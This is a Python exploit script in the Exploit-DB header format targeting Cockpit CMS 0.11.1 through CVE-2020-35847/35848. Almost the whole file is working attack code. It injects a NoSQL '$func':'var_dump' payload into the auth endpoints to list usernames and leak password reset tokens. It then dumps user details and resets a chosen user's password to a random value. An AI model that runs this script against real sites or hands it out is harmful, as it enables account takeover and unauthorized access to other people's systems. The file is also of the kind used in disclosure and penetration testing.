# Exploit Title: Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL Injection
# Date: 06-08-2021
# Exploit Author: Brian Ombongi
# Vendor Homepage: https://getcockpit.com/
# Version: Cockpit 0.11.1
# Tested on: Ubuntu 16.04.7
# CVE : CVE-2020-35847 & CVE-2020-35848

#!/usr/bin/python3
import json
import re
import requests
import random
import string
import argparse


def usage():
    guide = 'python3 exploit.py -u <target_url> '
    return guide

def arguments():
    parse = argparse.ArgumentParser(usage=usage())
    parse.add_argument('-u', dest='url', help='Site URL e.g http://cockpit.local', type=str, required=True)
    return parse.parse_args()

def test_connection(url):
	try:
		get = requests.get(url)
		if get.status_code == 200:
			print(f"[+] {url}: is reachable")
		else:
			print(f"{url}: is Not reachable, status_code: {get.status_code}")
	except requests.exceptions.RequestException as e:
		raise SystemExit(f"{url}: is Not reachable \nErr: {e}")


def enumerate_users(url):
    print("[-] Attempting Username Enumeration (CVE-2020-35846) : \n")
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
    }
    data= {"user":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("[+] Users Found : " + str(matches))
        return matches
    else:
        print("No users found")

def check_user(usernames):
    user = input("\n[-] Get user details For : ")
    if user not in usernames:
        print("User does not exist...Exiting")
        exit()
    else:
        return user


def reset_tokens(url):
    print("[+] Finding Password reset tokens")
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("\t Tokens Found : " + str(matches))
        return matches
    else:
        print("No tokens found, ")


def user_details(url, token):
    print("[+] Obtaining user information ")
    url = url + "/auth/newpassword"
    headers = {
        "Content-Type": "application/json"
        }
    userAndtoken = {}
    for t in token:
        data= {"token":t}
        req = requests.post(url, data=json.dumps(data), headers=headers)
        pattern=re.compile(r'(this.user\s*=)([^;]+)', re.I)
        matches = pattern.finditer(req.content.decode('utf-8'))
        for match in matches:
            matches = json.loads(match.group(2))
            if matches:
                print ("-----------------Details--------------------")
                for key, value in matches.items():

                    print("\t", "[*]", key ,":", value)
            else:
                print("No user information found.")
            user = matches['user']
            token = matches['_reset_token']
            userAndtoken[user] = token
            print("--------------------------------------------")
            continue
    return userAndtoken

def password_reset(url, token, user):
    print("[-] Attempting to reset %s's password:" %user)
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(10))
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":token, "password":password}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    if "success" in req.content.decode('utf-8'):
        print("[+] Password Updated Succesfully!")
        print("[+] The New credentials for %s is: \n \t Username : %s \n \t Password : %s" % (user, user, password))

def generate_token(url, user):
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"user":user}
    req = requests.post(url, data=json.dumps(data), headers=headers)

def confirm_prompt(question: str) -> bool:
    reply = None
    while reply not in ("", "y", "n"):
        reply = input(f"{question} (Y/n): ").lower()
        if reply == "y":
            return True
        elif reply == "n":
            return False
        else:
            return True

def pw_reset_trigger(details, user, url):
    for key in details:
        if key == user:
            password_reset(url, details[key], key)
        else:
            continue



if __name__ == '__main__':
    args = arguments()
    url = args.url
    test_connection(url)
    user = check_user(enumerate_users(url))
    generate_token(url, user)
    tokens = reset_tokens(url)
    details = user_details(url, tokens)
    print("\n")
    b = confirm_prompt("[+] Do you want to reset the passowrd for %s?" %user)
    if b:
        pw_reset_trigger(details, user, url)
    else:
        print("Exiting..")
        exit()